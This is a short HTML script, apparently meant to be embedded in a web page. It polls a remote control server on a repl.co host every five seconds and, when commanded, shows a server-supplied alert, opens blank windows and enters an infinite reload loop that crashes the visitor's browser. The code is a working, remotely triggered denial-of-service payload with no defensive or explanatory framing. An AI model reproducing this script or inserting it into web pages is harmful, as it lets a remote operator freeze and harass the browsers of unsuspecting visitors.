<script>
// enter pass here
var url = "https://crash-controle.awashcard0.repl.co"

    hello()

function hello() {
  setTimeout(function() {
    ya()
    hello()
  }, 5000);
}

function ya() {

    let Http = new XMLHttpRequest();
    Http.open("GET", url + "/val");
    Http.send();
    
    Http.onreadystatechange = (e) => {
      if (Http.responseText.includes("ym")) {
        // Crash with msg
        let Https = new XMLHttpRequest();
        Https.open("GET", url + "/msg");
        Https.send();
        Https.onreadystatechange = (e) => {
            alert(Https.responseText)
            window.open("about:blank")

            while(1)location.reload(1)
        }
      } else if (Http.responseText.includes("y")) {
        // Just crash
        window.open("about:blank")

        while(1)location.reload(1)
      } else if (Http.responseText.includes("m")) {
        // only msg

        let Http = new XMLHttpRequest();
        Http.open("GET", url + "/msg");
        Http.send();
        Http.onreadystatechange = (e) => {
            alert(Http.responseText)
        }
      }
    }
    }
